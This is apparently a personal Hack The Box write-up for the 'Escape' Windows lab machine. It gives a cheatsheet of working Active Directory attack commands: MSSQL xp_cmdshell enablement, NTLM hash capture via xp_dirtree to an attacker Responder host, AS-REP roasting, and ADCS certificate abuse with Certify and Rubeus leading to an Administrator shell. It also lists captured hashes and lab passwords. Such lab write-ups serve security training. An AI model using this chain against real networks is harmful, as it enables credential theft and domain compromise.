# Escape \[Windows Medium]

## Report

Find creds for an SQL account from SMB, use it to retrieve NTLM hash of the service user running MSSQL via Responder.

The errorlog file exposes the creds for 'ryan.cooper' who is part of the ADCS group (AD Certificate Services). This is compromised using Certify and Rubeus to extract a Kerberos ticket.

The kerberos service has a skew of +8h which does not seem to go by `nptdate` as a syncing mechanism seems to take place breaking the shell made in the process, `faketime` helps solve this

## Cheatsheet

```bash
python3 mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
enable_xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1

sudo responder -I tun0
EXEC master.sys.xp_dirtree '\\10.10.14.9\myshare',1, 1

#Shell as sql_svc
#No GPP, No ASREPROAST, Public Users folder denied, Program files nothing interesting

./GetNPUsers.py sequel.htb/ -dc-ip 10.10.11.202 -usersfile ~/htb/rooms/escape/userlist.txt
cat C:/SQLServer/Logs/ERRORLOG.BAK

nxc ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs

.\Certify.exe find /vulnerable
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
.\Rubeus.exe asktgt /user:Administrator /certificate:C:\Programdata\cert.pfx
base64 -d ticket.kirbi.b64 > ticket.kirbi
/opt/impacket/examples/ticketConverter.py ticket.kirbi ticket.ccache

export KRB5CCNAME=/home/jtripz/htb/rooms/escape/ticket.ccache; faketime -f '+8h' /usr/bin/python3 psexec.py sequel.htb/administrator@dc.sequel.htb -k -no-pass
```

## Loot

### Creds

sql\_svc::sequel:bbf7cdcafb35b0b2:70329245CCB3F48E4C00AD424C260E32:01010000000000000091996BDFE3DB01644FE9236298A08A00000000020008004C00520035004D0001001E00570049004E002D004A004B003100450039004100500031004C005800490004003400570049004E002D004A004B003100450039004100500031004C00580049002E004C00520035004D002E004C004F00430041004C00030014004C00520035004D002E004C004F00430041004C00050014004C00520035004D002E004C004F00430041004C00070008000091996BDFE3DB01060004000200000008003000300000000000000000000000003000004896F66EF8BDD8EBBA5AF457B4979AD662FB98601ECE84FF9006385465BC10E60A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0039000000000000000000

sql\_svc:REGGIE1234ronnie (From Responder)

Ryan.Cooper:NuclearMosquito3

### Proof

Kerberos Skew Time

ssl-date: 2025-06-23T12:29:40+00:00; +8h00m02s from scanner time (389, LDAP)

SSL cert: dc.sequel.htb (389,636)
